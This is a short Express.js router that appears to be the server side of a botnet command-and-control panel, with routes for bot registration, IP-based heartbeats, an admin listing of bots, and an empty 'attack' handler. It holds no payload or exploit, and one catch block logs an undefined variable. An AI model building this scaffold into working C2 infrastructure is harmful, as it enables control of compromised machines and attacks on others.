const express = require('express')
const debug = require('debug')('server:handleRoutes')
const chalk = require('chalk')

const bots = require('../controllers/bots')

const routes = express.Router()

let botCount = 0
let botIPs = []

function middleware(req, res, next) {
  next()
}

function router() {
  routes.use(middleware)

  async function admin (req, res) {
    try {
      var botsArray = bots.getBots()
      res.render('admin', {
        count: botsArray.length,
        bots: botsArray
      })
    } catch (err) {
      console.log(err)
    }
  }

  async function landing (req, res) {
    const bot = req.body
    try {
      if (Object.keys(bot).length !== 0) {
        let added = await bots.add(bot)
        if (added) {
          // res.sendFile()
          res.sendStatus(200)
        } else {
          res.send('Bot already exists')
        }
      }else {
        res.send('Did not recieve a bot in payload')
      }
    } catch (error) {
      console.log(error) 
    }
  }

  async function attack (req, res) {
    
  }
  async function heartbeat (req, res) {
    const { ip } = req.params
    try {
      await bots.heartbeat(ip)
      res.sendStatus(200)      
    } catch (error) {
      console.log(err)
    }

  }


  routes.get('/admin', admin)
  routes.post('/landing', landing)
  routes.get('/attack', attack)
  routes.get('/heartbeat:ip', heartbeat)

  return routes
}

module.exports = router()